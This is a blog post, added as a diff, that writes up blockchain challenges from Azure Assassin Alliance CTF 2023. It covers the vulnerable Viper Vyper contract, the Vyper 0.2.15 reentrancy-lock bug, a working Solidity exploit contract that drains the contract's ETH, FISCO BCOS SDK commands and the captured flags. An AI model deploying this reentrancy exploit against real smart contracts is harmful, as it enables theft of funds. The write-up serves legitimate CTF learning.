@@ -1,0 +1,209 @@
+<!doctype html><html class=scroll-smooth lang=en><head><meta charset=utf-8><link href=/css/style.css rel=stylesheet><link href=/line-awesome/css/line-awesome.min.css rel=stylesheet><script defer src=/js/main.js></script><title>Azure Assassin Alliance CTF 2023 Blockchain | Random thoughts here</title><body class="bg-white dark:bg-slate-900 transition ease-in-out"><section><div class="sticky top-0 bg-slate-100 dark:bg-slate-800"><div class="container mx-auto flex place-content-between py-16 lg:py-8 font-sans text-6xl lg:text-2xl text-slate-900 dark:text-slate-300"><div class=flex><a class="m-0 p-0 text-slate-900 hover:text-slate-700 dark:text-slate-300 dark:hover:text-slate-200" href=/blog/> /blog </a></div><div class="flex gap-4"><div class="hidden cursor-pointer" id=back-to-top><i class="las la-level-up-alt"></i></div><a href=/><i class="las la-home"></i></a><div class=cursor-pointer id=darkmode-toggle><div class="hidden dark:inline"><i class="las la-sun"></i></div><div class="inline dark:hidden"><i class="las la-moon"></i></div></div></div></div></div><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><script type=text/x-mathjax-config>
+      MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$','$']]}
+      });
+    </script><div class="container mb-16"><div class="mt-4 font-serif text-slate-600 dark:text-slate-500 text-4xl lg:text-base">2023-11-01</div><h1 class="w-full mt-4 mb-8 font-serif text-8xl lg:text-4xl text-slate-900 dark:text-slate-300">Azure Assassin Alliance CTF 2023 Blockchain</h1><div class="w-100 border-t mb-8 border-slate-300 dark:border-slate-700"></div><div class=prose-boring><p>This time my teammates from 0RAYS and I participated in Azure Assassin Alliance CTF 2023 and got third place🥉<p>I participated in solving some web and misc challenges. The web challenges is not very difficult and not very interesting, but the blockchain challenge really appeals to me. So I feel the necessity to write it down.<h2 id=viper>Viper</h2><pre class=language-yaml data-lang=yaml style=color:#d8dee9;background-color:#2e3440><code class=language-yaml data-lang=yaml><span style=color:#a3be8c>Description
+</span><span style=color:#a3be8c>When you encounter a viper, you need to be more careful to prevent injury
+</span><span>
+</span><span style=color:#a3be8c>Service
+</span><span style=color:#8fbcbb>Geth</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>http://120.46.58.72:8545
+</span><span style=color:#8fbcbb>Faucet</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>http://120.46.58.72:8080
+</span><span style=color:#8fbcbb>Playground</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>nc 120.46.58.72 20000
+</span></code></pre><p>source code:<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#616e88>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity </span><span style=color:#81a1c1>^</span><span style=color:#b48ead>0.8</span><span style=color:#81a1c1>.</span><span style=color:#b48ead>7</span><span style=color:#eceff4>;
+</span><span>
+</span><span style=color:#81a1c1>import </span><span style=color:#a3be8c>"@openzeppelin/contracts@4.0.0/token/ERC20/ERC20.sol"</span><span style=color:#eceff4>;
+</span><span style=color:#81a1c1>import </span><span style=color:#a3be8c>"@openzeppelin/contracts@4.0.0/access/Ownable.sol"</span><span style=color:#eceff4>;
+</span><span>
+</span><span>contract </span><span style=color:#d8dee9;font-weight:700>VETH </span><span>is </span><span style=color:#d8dee9;font-weight:700>ERC20</span><span style=color:#eceff4>, </span><span>Ownable {
+</span><span>    </span><span style=color:#88c0d0>constructor</span><span>() </span><span style=color:#88c0d0>ERC20</span><span>(</span><span style=color:#a3be8c>"VETH"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"vETH"</span><span>) </span><span style=color:#88c0d0>Ownable</span><span>() {}
+</span><span>
+</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>mint</span><span>(address to</span><span style=color:#eceff4>, </span><span>uint256 amount) </span><span style=color:#88c0d0>public onlyOwner </span><span>{
+</span><span>        </span><span style=color:#88c0d0>_mint</span><span>(to</span><span style=color:#eceff4>, </span><span>amount)</span><span style=color:#eceff4>;
+</span><span>    }
+</span><span>}
+</span></code></pre><pre class=language-python data-lang=python style=color:#d8dee9;background-color:#2e3440><code class=language-python data-lang=python><span style=color:#616e88># @version ^0.2.16
+</span><span>
+</span><span style=color:#81a1c1>from </span><span>vyper</span><span style=color:#81a1c1>.</span><span>interfaces </span><span style=color:#81a1c1>import ERC20
+</span><span>
+</span><span>event Deposit</span><span style=color:#eceff4>:
+</span><span>    user</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>indexed</span><span>(address)
+</span><span>    token</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>indexed</span><span>(address)
+</span><span>    amount</span><span style=color:#eceff4>: </span><span>uint256
+</span><span>
+</span><span>event Withdraw</span><span style=color:#eceff4>:
+</span><span>    user</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>indexed</span><span>(address)
+</span><span>    token</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>indexed</span><span>(address)
+</span><span>    amount</span><span style=color:#eceff4>: </span><span>uint256
+</span><span>
+</span><span>event Swap</span><span style=color:#eceff4>:
+</span><span>    user</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>indexed</span><span>(address)
+</span><span>    tokenIn</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>indexed</span><span>(address)
+</span><span>    tokenOut</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>indexed</span><span>(address)
+</span><span>    amount</span><span style=color:#eceff4>: </span><span>uint256
+</span><span>
+</span><span>
+</span><span style=color:#81a1c1>ETH</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>constant</span><span>(address) </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE
+</span><span style=color:#81a1c1>NCOINS</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>constant</span><span>(int128) </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>2
+</span><span style=color:#81a1c1>BONUS</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>constant</span><span>(uint256) </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>4276545
+</span><span>
+</span><span>owner</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>public</span><span>(address)
+</span><span>initialized</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>public</span><span>(</span><span style=color:#81a1c1>bool</span><span>)
+</span><span>coins</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>public</span><span>(address[</span><span style=color:#81a1c1>NCOINS</span><span>])
+</span><span>ratio</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>public</span><span>(uint256)
+</span><span>balances</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>public</span><span>(HashMap[int128, HashMap[address, uint256]])
+</span><span>
+</span><span>
+</span><span style=color:#d08770>@</span><span>payable
+</span><span style=color:#d08770>@</span><span>external
+</span><span style=color:#81a1c1>def </span><span style=color:#88c0d0>__init__</span><span>():
+</span><span>    </span><span style=color:#81a1c1>self.</span><span>owner </span><span style=color:#81a1c1>= </span><span>msg</span><span style=color:#81a1c1>.</span><span>sender
+</span><span>    </span><span style=color:#81a1c1>self.</span><span>initialized </span><span style=color:#81a1c1>= False
+</span><span>
+</span><span>
+</span><span style=color:#d08770>@</span><span>external
+</span><span style=color:#81a1c1>def </span><span style=color:#88c0d0>initialize</span><span>(underlying</span><span style=color:#eceff4>: </span><span>address):
+</span><span>    </span><span style=color:#81a1c1>assert </span><span>msg</span><span style=color:#81a1c1>.</span><span>sender </span><span style=color:#81a1c1>== self.</span><span>owner
+</span><span>    </span><span style=color:#81a1c1>assert not self.</span><span>initialized, </span><span style=color:#a3be8c>"has been initialized"
+</span><span>    </span><span style=color:#81a1c1>self.</span><span>coins[</span><span style=color:#b48ead>0</span><span>] </span><span style=color:#81a1c1>= ETH
+</span><span>    </span><span style=color:#81a1c1>self.</span><span>coins[</span><span style=color:#b48ead>1</span><span>] </span><span style=color:#81a1c1>= </span><span>underlying
+</span><span>    </span><span style=color:#81a1c1>self.</span><span>ratio </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>2
+</span><span>    </span><span style=color:#81a1c1>self.</span><span>initialized </span><span style=color:#81a1c1>= True
+</span><span>
+</span><span>
+</span><span style=color:#d08770>@</span><span>payable
+</span><span style=color:#d08770>@</span><span>external
+</span><span style=color:#d08770>@</span><span>nonreentrant(</span><span style=color:#a3be8c>'lock'</span><span>)
+</span><span style=color:#81a1c1>def </span><span style=color:#88c0d0>deposit</span><span>(index</span><span style=color:#eceff4>: </span><span>int128</span><span style=color:#eceff4>, </span><span>amount</span><span style=color:#eceff4>: </span><span>uint256):
+</span><span>    </span><span style=color:#81a1c1>assert self.</span><span>initialized, </span><span style=color:#a3be8c>"not available yet"
+</span><span>    </span><span style=color:#81a1c1>assert </span><span>index </span><span style=color:#81a1c1>>= </span><span style=color:#b48ead>0 </span><span style=color:#81a1c1>and </span><span>index </span><span style=color:#81a1c1>< NCOINS
+</span><span>    token</span><span style=color:#eceff4>: </span><span>address </span><span style=color:#81a1c1>= self.</span><span>coins[index]
+</span><span>
+</span><span>    </span><span style=color:#81a1c1>if </span><span>token </span><span style=color:#81a1c1>== ETH</span><span>:
+</span><span>        </span><span style=color:#81a1c1>assert </span><span>msg</span><span style=color:#81a1c1>.</span><span>value </span><span style=color:#81a1c1>>= </span><span>amount
+</span><span>        </span><span style=color:#81a1c1>if </span><span>msg</span><span style=color:#81a1c1>.</span><span>value </span><span style=color:#81a1c1>- </span><span>amount </span><span style=color:#81a1c1>> </span><span style=color:#b48ead>0</span><span>:
+</span><span>            </span><span style=color:#88c0d0>raw_call</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>b</span><span style=color:#a3be8c>""</span><span style=color:#eceff4>, </span><span>value</span><span style=color:#81a1c1>=</span><span>msg</span><span style=color:#81a1c1>.</span><span>value </span><span style=color:#81a1c1>- </span><span>amount)
+</span><span>    </span><span style=color:#81a1c1>else</span><span>:
+</span><span>        </span><span style=color:#88c0d0>ERC20</span><span>(token)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>transferFrom</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>self</span><span style=color:#eceff4>, </span><span>amount)
+</span><span>    </span><span style=color:#81a1c1>self.</span><span>balances[index][msg</span><span style=color:#81a1c1>.</span><span>sender] </span><span style=color:#81a1c1>+= </span><span>amount
+</span><span>    
+</span><span>    log </span><span style=color:#88c0d0>Deposit</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span>token</span><span style=color:#eceff4>, </span><span>amount)
+</span><span>
+</span><span>
+</span><span style=color:#d08770>@</span><span>external
+</span><span style=color:#d08770>@</span><span>nonreentrant(</span><span style=color:#a3be8c>'lock'</span><span>)
+</span><span style=color:#81a1c1>def </span><span style=color:#88c0d0>withdraw</span><span>(index</span><span style=color:#eceff4>: </span><span>int128</span><span style=color:#eceff4>, </span><span>amount</span><span style=color:#eceff4>: </span><span>uint256):
+</span><span>    </span><span style=color:#81a1c1>assert self.</span><span>initialized, </span><span style=color:#a3be8c>"not available yet"
+</span><span>    </span><span style=color:#81a1c1>assert </span><span>index </span><span style=color:#81a1c1>>= </span><span style=color:#b48ead>0 </span><span style=color:#81a1c1>and </span><span>index </span><span style=color:#81a1c1>< NCOINS
+</span><span>    token</span><span style=color:#eceff4>: </span><span>address </span><span style=color:#81a1c1>= self.</span><span>coins[index]
+</span><span>    </span><span style=color:#81a1c1>assert self.</span><span>balances[index][msg</span><span style=color:#81a1c1>.</span><span>sender] </span><span style=color:#81a1c1>>= </span><span>amount
+</span><span>
+</span><span>    </span><span style=color:#81a1c1>if </span><span>token </span><span style=color:#81a1c1>== ETH</span><span>:
+</span><span>        </span><span style=color:#88c0d0>raw_call</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>b</span><span style=color:#a3be8c>""</span><span style=color:#eceff4>, </span><span>value</span><span style=color:#81a1c1>=</span><span>amount)
+</span><span>    </span><span style=color:#81a1c1>else</span><span>:
+</span><span>        </span><span style=color:#88c0d0>ERC20</span><span>(token)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>transfer</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span>amount)
+</span><span>    </span><span style=color:#81a1c1>self.</span><span>balances[index][msg</span><span style=color:#81a1c1>.</span><span>sender] </span><span style=color:#81a1c1>-= </span><span>amount
+</span><span>    
+</span><span>    log </span><span style=color:#88c0d0>Withdraw</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span>token</span><span style=color:#eceff4>, </span><span>amount)
+</span><span>
+</span><span>
+</span><span style=color:#d08770>@</span><span>payable
+</span><span style=color:#d08770>@</span><span>external
+</span><span style=color:#d08770>@</span><span>nonreentrant(</span><span style=color:#a3be8c>'lock'</span><span>)
+</span><span style=color:#81a1c1>def </span><span style=color:#88c0d0>swap</span><span>(in_index</span><span style=color:#eceff4>: </span><span>int128</span><span style=color:#eceff4>, </span><span>out_index</span><span style=color:#eceff4>: </span><span>int128</span><span style=color:#eceff4>, </span><span>amount</span><span style=color:#eceff4>: </span><span>uint256):
+</span><span>    </span><span style=color:#81a1c1>assert self.</span><span>initialized, </span><span style=color:#a3be8c>"not available yet"
+</span><span>    </span><span style=color:#81a1c1>assert </span><span>in_index </span><span style=color:#81a1c1>>= </span><span style=color:#b48ead>0 </span><span style=color:#81a1c1>and </span><span>in_index </span><span style=color:#81a1c1>< NCOINS
+</span><span>    </span><span style=color:#81a1c1>assert </span><span>out_index </span><span style=color:#81a1c1>>= </span><span style=color:#b48ead>0 </span><span style=color:#81a1c1>and </span><span>out_index </span><span style=color:#81a1c1>< NCOINS
+</span><span>    </span><span style=color:#81a1c1>assert </span><span>in_index </span><span style=color:#81a1c1>!= </span><span>out_index
+</span><span>    
+</span><span>    </span><span style=color:#81a1c1>if </span><span>in_index </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>0</span><span>:
+</span><span>        </span><span style=color:#81a1c1>if </span><span>msg</span><span style=color:#81a1c1>.</span><span>value </span><span style=color:#81a1c1>- </span><span>amount </span><span style=color:#81a1c1>> </span><span style=color:#b48ead>0</span><span>:
+</span><span>            </span><span style=color:#88c0d0>raw_call</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>b</span><span style=color:#a3be8c>""</span><span style=color:#eceff4>, </span><span>value</span><span style=color:#81a1c1>=</span><span>msg</span><span style=color:#81a1c1>.</span><span>value </span><span style=color:#81a1c1>- </span><span>amount)
+</span><span>        increase</span><span style=color:#eceff4>: </span><span>uint256 </span><span style=color:#81a1c1>= </span><span>amount </span><span style=color:#81a1c1>* self.</span><span>ratio
+</span><span>        </span><span style=color:#81a1c1>self.</span><span>balances[out_index][msg</span><span style=color:#81a1c1>.</span><span>sender] </span><span style=color:#81a1c1>+= </span><span>increase </span><span style=color:#81a1c1>+ BONUS
+</span><span>    </span><span style=color:#81a1c1>else</span><span>:
+</span><span>        _before</span><span style=color:#eceff4>: </span><span>uint256 </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>ERC20</span><span>(</span><span style=color:#81a1c1>self.</span><span>coins[in_index])</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>self</span><span>)
+</span><span>        </span><span style=color:#81a1c1>if </span><span>msg</span><span style=color:#81a1c1>.</span><span>value </span><span style=color:#81a1c1>> </span><span style=color:#b48ead>0</span><span>:
+</span><span>            </span><span style=color:#88c0d0>raw_call</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>b</span><span style=color:#a3be8c>""</span><span style=color:#eceff4>, </span><span>value</span><span style=color:#81a1c1>=</span><span>msg</span><span style=color:#81a1c1>.</span><span>value)
+</span><span>        </span><span style=color:#88c0d0>ERC20</span><span>(</span><span style=color:#81a1c1>self.</span><span>coins[in_index])</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>transferFrom</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>self</span><span style=color:#eceff4>, </span><span>amount)
+</span><span>        _after</span><span style=color:#eceff4>: </span><span>uint256 </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>ERC20</span><span>(</span><span style=color:#81a1c1>self.</span><span>coins[in_index])</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>self</span><span>)
+</span><span>        increase</span><span style=color:#eceff4>: </span><span>uint256 </span><span style=color:#81a1c1>= </span><span>(_after </span><span style=color:#81a1c1>- </span><span>_before) </span><span style=color:#81a1c1>/ self.</span><span>ratio
+</span><span>        </span><span style=color:#81a1c1>self.</span><span>balances[out_index][msg</span><span style=color:#81a1c1>.</span><span>sender] </span><span style=color:#81a1c1>+= </span><span>increase
+</span><span>    
+</span><span>    log </span><span style=color:#88c0d0>Swap</span><span>(msg</span><span style=color:#81a1c1>.</span><span>sender</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>self.</span><span>coins[in_index]</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>self.</span><span>coins[out_index]</span><span style=color:#eceff4>, </span><span>amount)
+</span><span>
+</span><span>
+</span><span style=color:#d08770>@</span><span>external
+</span><span style=color:#d08770>@</span><span>view
+</span><span style=color:#81a1c1>def </span><span style=color:#88c0d0>isSolved</span><span>() </span><span style=color:#eceff4>-> </span><span style=color:#81a1c1>bool</span><span>:
+</span><span>    </span><span style=color:#81a1c1>return self.</span><span>balance </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>0
+</span></code></pre><p>In the initial state, the balance of VETH is 0 while the Viper has <code>3 eth</code><p>Referrence to <a href=https://hackmd.io/@vyperlang/HJUgNMhs2#Vulnerability-Introduced-Malfunctioning-Re-Entrancy-Locks-in-v0215>Vyper Nonreentrancy Lock Vulnerability Technical Post-Mortem Report - HackMD</a>，the vulnerability arises from how the <code>storage_slot</code> offsets of re-entrancy keys were ignoring the actual <code>&LTkey></code> of the <code>@nonreentrant(&LTkey>)</code> decorator and were simply reserving a new slot for each seen <code>@nonreentrant</code> decorator regardless of what “key” was utilized, leading to <code>cross-function reentrance</code> 。<p>Then dive into the code:<ul><li><p>VETH.sol implement a simple token contract by importing <code>ERC20</code></p><li><p>the address of deployed VETH contract would be passed to <code>initialize</code> function of Viper, as a token conversion target</p><li><p>Viper contract has following callable function:</p> <ul><li><p><strong>deposit</strong> | index 0 for deposit ETH, index 1 for deposit VETH token</p><li><p><strong>withdraw</strong> | index 0 for withdraw ETH, index 1 for deposit VETH token</p><li><p><strong>swap</strong> | index 0,1 for converse ETH to VETH token, index 1,0 for converse VETH token to ETH</p></ul></ul><p>Simply noted that the implement of these function are not based on <code>Checks, Effects, and Interactions</code>, which means its exploitable.<p>Taking advantage of the reentrancy vulnerability, during the process of exchanging VETH token for ETH, VETH token is stored in the Viper contract. While increasing Viper’s VETH balance, it also increases the VETH and ETH balances of one’s own account in viper.<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#616e88>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity </span><span style=color:#81a1c1>^</span><span style=color:#b48ead>0.8</span><span style=color:#81a1c1>.</span><span style=color:#b48ead>0</span><span style=color:#eceff4>;
+</span><span>
+</span><span style=color:#81a1c1>interface Viper </span><span>{
+</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>deposit</span><span>(int128</span><span style=color:#eceff4>, </span><span>uint256) </span><span style=color:#88c0d0>external payable </span><span style=color:#eceff4>;
+</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>withdraw</span><span>(int128</span><span style=color:#eceff4>, </span><span>uint256) </span><span style=color:#88c0d0>external </span><span style=color:#eceff4>;
+</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>swap</span><span>(int128</span><span style=color:#eceff4>, </span><span>int128</span><span style=color:#eceff4>, </span><span>uint256) </span><span style=color:#88c0d0>external payable </span><span style=color:#eceff4>;
+</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>isSolved</span><span>() </span><span style=color:#88c0d0>view external returns </span><span>(bool)</span><span style=color:#eceff4>;
+</span><span>}
+</span><span>
+</span><span style=color:#81a1c1>interface VETH </span><span>{
+</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>approve</span><span>(address</span><span style=color:#eceff4>, </span><span>uint256) </span><span style=color:#88c0d0>external payable </span><span style=color:#eceff4>;
+</span><span>}
+</span><span>contract exp {
+</span><span>
+</span><span>    Viper public viper </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>Viper</span><span>(</span><span style=color:#b48ead>0x6A933E75E415e0E56455f44dD0e486B3258F89a0</span><span>)</span><span style=color:#eceff4>;
+</span><span>    </span><span style=color:#d8dee9;font-weight:700>VETH </span><span>public veth </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>VETH</span><span>(</span><span style=color:#b48ead>0x692ab1BA329Dd0CAdDffF1c23FfCC3614375aE69</span><span>)</span><span style=color:#eceff4>;
+</span><span>    uint256 public count</span><span style=color:#eceff4>;
+</span><span>
+</span><span>    </span><span style=color:#88c0d0>constructor</span><span>() payable {
+</span><span>        </span><span style=color:#616e88>// 4 ether
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>go</span><span>() </span><span style=color:#88c0d0>public </span><span>{
+</span><span>        veth</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>approve</span><span>(</span><span style=color:#88c0d0>address</span><span>(viper)</span><span style=color:#eceff4>, </span><span style=color:#88c0d0>type</span><span>(uint256)</span><span style=color:#81a1c1>.</span><span>max)</span><span style=color:#eceff4>;
+</span><span>        viper</span><span style=color:#81a1c1>.</span><span>swap{</span><span style=color:#5e81ac>value</span><span style=color:#eceff4>: </span><span style=color:#b48ead>3 </span><span>ether}(</span><span style=color:#b48ead>0</span><span style=color:#eceff4>, </span><span style=color:#b48ead>1</span><span style=color:#eceff4>, </span><span style=color:#b48ead>3 </span><span>ether)</span><span style=color:#eceff4>;
+</span><span>        viper</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>withdraw</span><span>(</span><span style=color:#b48ead>1</span><span style=color:#eceff4>, </span><span style=color:#b48ead>6 </span><span>ether)</span><span style=color:#eceff4>;
+</span><span>        viper</span><span style=color:#81a1c1>.</span><span>swap{</span><span style=color:#5e81ac>value</span><span style=color:#eceff4>: </span><span style=color:#b48ead>1 </span><span>wei}(</span><span style=color:#b48ead>1</span><span style=color:#eceff4>, </span><span style=color:#b48ead>0</span><span style=color:#eceff4>, </span><span style=color:#b48ead>0</span><span>)</span><span style=color:#eceff4>;
+</span><span>        viper</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>withdraw</span><span>(</span><span style=color:#b48ead>1</span><span style=color:#eceff4>, </span><span style=color:#b48ead>6 </span><span>ether)</span><span style=color:#eceff4>;
+</span><span>        viper</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>swap</span><span>(</span><span style=color:#b48ead>1</span><span style=color:#eceff4>, </span><span style=color:#b48ead>0</span><span style=color:#eceff4>, </span><span style=color:#b48ead>6 </span><span>ether)</span><span style=color:#eceff4>;
+</span><span>        viper</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>withdraw</span><span>(</span><span style=color:#b48ead>0</span><span style=color:#eceff4>, </span><span style=color:#b48ead>6 </span><span>ether)</span><span style=color:#eceff4>;
+</span><span>    }
+</span><span>
+</span><span>    </span><span style=color:#88c0d0>receive</span><span>() external payable {
+</span><span>        </span><span style=color:#81a1c1>if </span><span>(count</span><span style=color:#81a1c1>==</span><span style=color:#b48ead>0</span><span>) {
+</span><span>            count</span><span style=color:#81a1c1>++</span><span style=color:#eceff4>;
+</span><span>            viper</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>deposit</span><span>(</span><span style=color:#b48ead>1</span><span style=color:#eceff4>, </span><span style=color:#b48ead>6 </span><span>ether)</span><span style=color:#eceff4>;
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span></code></pre><pre class=language-Solidity data-lang=Solidity style=color:#d8dee9;background-color:#2e3440><code class=language-Solidity data-lang=Solidity><span>ACTF{8EW@rE_0F_vEnom0us_sNaK3_81T3$_as_1t_HA$_nO_cOnSc1ENCe}
+</span></code></pre><h2 id=amop-1>AMOP 1</h2><pre class=language-yaml data-lang=yaml style=color:#d8dee9;background-color:#2e3440><code class=language-yaml data-lang=yaml><span style=color:#8fbcbb>Description</span><span style=color:#eceff4>:
+</span><span style=color:#a3be8c>FISCO BCOS is a blockchain that allows you to pass messages.
+</span><span>
+</span><span style=color:#8fbcbb>Service</span><span style=color:#eceff4>:
+</span><span style=color:#a3be8c>Access 120.46.58.72:30201 for the channel endpoint.
+</span></code></pre><p>The official document of <code>FISCO BCOS</code> was written badly while using abbreviation and full name represent two different versions with incomplete description. Fortunately the <code>usage</code> of <a href=https://github.com/FISCO-BCOS/java-sdk-demo>SDK</a> is enough to solve this challenge.<pre class=language-Shell data-lang=Shell style=color:#d8dee9;background-color:#2e3440><code class=language-Shell data-lang=Shell><span>root@Aliyun-ubuntu2004:~/fisco/java-sdk-demo/dist# java -cp "apps/*:lib/*:conf/" org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriber flag1
+</span><span>SLF4J: Class path contains multiple SLF4J bindings.
+</span><span>SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.19.0.jar!/org/slf4j/impl/StaticLoggerBinder.class]
+</span><span>SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.17.1.jar!/org/slf4j/impl/StaticLoggerBinder.class]
+</span><span>SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.
+</span><span>SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]
+</span><span>Start test
+</span><span>Step 2:Receive msg, time: 2023-10-28 14:48:23topic:flag1 content:ACTF{Con5oR7ium_B1ock_
+</span></code></pre><pre class=language-Shell data-lang=Shell style=color:#d8dee9;background-color:#2e3440><code class=language-Shell data-lang=Shell><span>root@Aliyun-ubuntu2004:~/fisco/java-sdk-demo/dist# java -cp 'conf/:lib/*:apps/*' org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriberPrivateByKey subscribe flag2 conf/privkey
+</span><span>SLF4J: Class path contains multiple SLF4J bindings.
+</span><span>SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.19.0.jar!/org/slf4j/impl/StaticLoggerBinder.class]
+</span><span>SLF4J: Found binding in [jar:file:/root/fisco/java-sdk-demo/dist/lib/log4j-slf4j-impl-2.17.1.jar!/org/slf4j/impl/StaticLoggerBinder.class]
+</span><span>SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.
+</span><span>SLF4J: Actual binding is of type [org.apache.logging.slf4j.Log4jLoggerFactory]
+</span><span>Start test
+</span><span>Step 2:Receive msg, time: 2023-10-28 14:55:18topic:flag2 content:cHAiN_sO_INterESt1NG}
+</span></code></pre><pre style=color:#d8dee9;background-color:#2e3440><code><span>ACTF{Con5oR7ium_B1ock_cHAiN_sO_INterESt1NG}
+</span></code></pre><h2 id=amop-2>AMOP 2</h2><pre class=language-yaml data-lang=yaml style=color:#d8dee9;background-color:#2e3440><code class=language-yaml data-lang=yaml><span style=color:#8fbcbb>Description</span><span style=color:#eceff4>:
+</span><span style=color:#a3be8c>FISCO BCOS is a blockchain that allow you to pass message.
+</span><span>
+</span><span style=color:#8fbcbb>Service</span><span style=color:#eceff4>:
+</span><span style=color:#a3be8c>Access 120.46.58.72:48547 for RPC
+</span><span style=color:#a3be8c>Access 120.46.58.72:41202 for channel endpoint
+</span></code></pre><p>(I’ll make it up soon)</div></div></section>
